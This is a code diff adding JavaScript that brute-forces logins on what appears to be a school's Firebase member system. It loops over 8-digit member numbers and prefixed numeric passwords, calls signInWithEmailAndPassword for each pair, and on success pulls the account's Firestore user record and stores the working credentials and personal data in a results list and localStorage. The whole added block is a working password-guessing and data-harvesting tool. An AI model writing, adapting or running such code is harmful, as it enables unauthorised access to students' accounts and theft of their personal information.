@@ -235,5 +235,150 @@ window.stopSearch = () => {
 
   log("停止要求");
 };
+  // =======================
+// 成功結果保存配列
+// =======================
+
+const foundResults = [];
+
+// =======================
+// メイン処理
+// =======================
+
+async function run() {
+
+  try {
+
+    const memberText =
+      document.getElementById("memberRange").value;
+
+    const pwText =
+      document.getElementById("pwRange").value;
+
+    const [mStart, mEnd] =
+      parseMemberRange(memberText);
+
+    const [prefix, pStart, pEnd] =
+      parsePwRange(pwText);
+
+    for (let m = mStart; m <= mEnd; m++) {
+
+      if (!running) {
+        log("停止");
+        return;
+      }
+
+      const member =
+        String(m).padStart(8, "0");
+
+      const email =
+        `${member}@your-school-member.com`;
+
+      for (let p = pStart; p <= pEnd; p++) {
+
+        if (!running) {
+          log("停止");
+          return;
+        }
+
+        const password =
+          `${prefix}${p}`;
+
+        log(`試行 ${email} / ${password}`);
+
+        try {
+
+          // =======================
+          // ログイン
+          // =======================
+
+          const cred =
+            await signInWithEmailAndPassword(
+              auth,
+              email,
+              password
+            );
+
+          log("ログイン成功");
+
+          const uid = cred.user.uid;
+
+          // =======================
+          // Firestore取得
+          // =======================
+
+          const memberId =
+            localStorage.getItem("memberId") || uid;
+
+          const snap =
+            await getDoc(
+              doc(db, "users", memberId)
+            );
+
+          if (snap.exists()) {
+
+            const data = snap.data();
+
+            // =======================
+            // 保存データ
+            // =======================
+
+            const resultData = {
+              member,
+              email,
+              password,
+              uid,
+              data
+            };
+
+            foundResults.push(resultData);
+
+            // =======================
+            // 表示更新
+            // =======================
+
+            document.getElementById("result").value =
+              JSON.stringify(foundResults, null, 2);
+
+            console.log(resultData);
+
+            // =======================
+            // localStorage保存
+            // =======================
+
+            localStorage.setItem(
+              "foundResults",
+              JSON.stringify(foundResults)
+            );
+
+            log(`発見 ${member} / ${password}`);
+            log(`現在 ${foundResults.length} 件保存`);
+
+          } else {
+
+            log("ドキュメントなし");
+
+          }
+
+        } catch (e) {
+
+          log("失敗:", e.message);
+
+        }
+
+      }
+
+    }
+
+    log("最後まで完了");
+
+  } catch (e) {
+
+    log("入力形式エラー");
+    log(e.message);
+
+  }
+
+}
 
 </script>
